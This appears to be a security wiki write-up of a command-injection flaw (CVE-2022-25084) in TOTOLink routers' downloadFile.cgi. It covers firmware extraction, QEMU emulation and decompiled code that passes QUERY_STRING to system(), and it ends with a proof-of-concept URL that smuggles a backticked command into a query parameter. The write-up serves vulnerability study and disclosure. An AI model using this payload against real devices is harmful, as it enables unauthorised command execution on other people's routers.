# TOTOLink Multiple Devices Download.cgi Remote Command Execution Vulnerability CVE-2022-25084

## Vulnerability Description

TOTOLink Multiple Devices Download.cgi file has a remote command execution vulnerability. Attackers can obtain server permissions by constructing special requests.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">TOTOLink Multiple Devices</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">"totolink"</span>

## Vulnerability reappears

Download router firmware

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648907409606-0704b8c0-aa5c-44d4-9d45-9fd1c0c62736.png)

Use binwalk to break down firmware

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648907425761-dabc39f3-ac5e-483c-b446-4e7a3883afec.png)

View the broken down file

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648907514313-7f8d3965-8435-484d-b67d-b04aae2da33e.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648907561137-36b56f40-cc42-4c25-b53a-74554b0e5fa7.png)

Use qemu to build a router

```php
#set network
sudo brctl addbr virbr2
sudo ifconfig virbr2 192.168.6.1/24 up
sudo tunctl -t tap2
sudo ifconfig tap2 192.168.6.11/24 up
sudo brctl addif virbr2 tap2

qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1" -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic
```

After creation, execute commands in qemu to start the router

```php
ifconfig eth0 192.168.6.11 up 
scp -r squashfs-root/ root@192.168.6.11:/root/    	
chroot ./squashfs-root/ /bin/sh
touch /var/run/lighttpd.pid
./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
```

Note that the `lighttpd.conf` file needs to be modified with the `server.pid-file` parameter

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648908009576-87dcb518-213e-49cf-9a00-9f3c4d90e955.png)

Access the router page after startup

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648912800395-a085fc01-e97b-4044-bc06-fc5f894928f5.png)

We found the file directory to be analyzed `squashfs-root/web_cste/cgi-bin`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648909334138-f28cf393-17e6-48a8-80f0-7a5288419e78.png)

Analyze cgi files using Ghidra `downloadFile.cgi`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648910386798-e04871ca-ff36-4843-bb3d-2f382c078ed4.png)

We noticed that the system executes the command

```php
pcVar1 = getenv("QUERY_STRING");
memset(acStack1424,0,0x200);
memset(acStack912,0,0x200);
sprintf(acStack1424,"echo QUERY_STRING:%s >/tmp/download",pcVar1);
system(acStack1424);
```

where getenv gets the parameters from the requested Url, passes them to pcVar1, and then assigns the value to acStack1424 through the following sprintf. Use the system function to execute the command.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648910646489-cfd02a84-6b04-4fb4-a4fa-dd3e007c045a.png)

We construct the request package control QUERY_STRING parameter to perform malicious command execution

```php
/cgi-bin/downloadFlile.cgi?payload=`ls>../cmd.txt`
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648912604072-692cfff6-164e-4724-9a10-f89b3b62dc79.png)

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1648912691525-e03b2fc4-4cf4-46d7-a379-e31a80d0f2d6.png)